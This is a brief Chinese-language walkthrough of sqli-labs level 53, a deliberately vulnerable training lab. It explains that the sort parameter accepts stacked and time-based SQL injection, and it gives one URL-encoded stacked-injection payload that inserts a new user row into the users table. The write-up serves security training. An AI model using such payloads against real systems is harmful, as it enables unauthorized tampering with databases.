## sql-labs第五十三关

该参数是字符型，单引号闭合，没有报错显示，可以使用堆叠注入和延时注入。

![](./img/8ec2e8d4426094740bc66f73b2d3d252.png)



~~~ cmd
sort=-1%27;insert%20into%20users(id,username,password)%20values%20(%2753%27,%27less38%27,%27hello%27)--+
~~~

![](.\img\Less-53-01.PNG)
